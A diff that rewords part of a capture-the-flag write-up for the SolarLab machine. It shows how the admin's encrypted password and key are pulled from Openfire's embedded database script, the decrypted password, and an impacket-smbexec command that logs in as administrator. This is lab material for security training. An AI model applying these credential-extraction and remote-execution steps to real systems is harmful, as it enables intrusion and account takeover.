@@ -253,13 +253,11 @@ get powershell as openfire with the same technique:
 
 ----------------------------
 ## SQL Analysis
-now i have access to `/openfire/` Folder mentioned before.
-i found some db scripts in the `/openfire/embedded-db` folder 
-the `openfire.script` file included table and user creation queries for the DB.
-by analyzing the file and searching for `CREATE` and `INSERT` queries with "password" search term i found a query for creating T
-the users table, and insert query for inserting an admin user.
+Now, with access to the /openfire/ folder, I found some database scripts in the /openfire/embedded-db folder. The openfire.script file included queries for creating tables and users.
 
-the query above shows the schema for inserting users, 
+By analyzing the file and searching for "password," I found the user creation query for the admin account.
+
+The OFUSER table contains user data, including encrypted passwords, Here is how the table is created:
 ```sql
 CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),
 ITERATIONS INTEGER,
@@ -269,8 +267,7 @@ PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255)
 ,NAME VARCHAR(100)
 ,EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
 ```
-so the table `OFUSER` holds the accounts,
-the query for inserting users is like this:
+The OFUSER table contains user data, including encrypted passwords:
 (name,`key`,serverkey, salt, `plaintext password`, `encrypted password`....etc) 
 
 Looking further i discovered a query for creating the admin user.
@@ -287,12 +284,12 @@ type .\openfire.script | findstr "OFPROPERTY"
 ```
 ![alt text](../images/solarlab/insert.png)
 
-so now that i have the encrypted password:
+Using the key and the encrypted password, I decrypted the admin password:
 ```
-*Encrypted-pass:
+* Encrypted-pass:
 becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac
 62d4e89b2856b0289b365f3069802e59d442
-*Key:
+* Key:
 hGXiFzsKaAeYLjn  
 ```
 i used the tool from the second link to decrypt the password:
@@ -307,8 +304,7 @@ ThisPasswordShouldDo!@
 -----------------------------------
 ## SYSTEM SHELL
 
-I tried to login to the openfire page but it didnt work out
-Lets try to use it as the administrator password for the machine itself using smbexec:
+Lets try to use that as the administrator password for the machine using smbexec:
 ```
 impacket-smbexec administrator:'<pw>'@<victim-ip
 ```
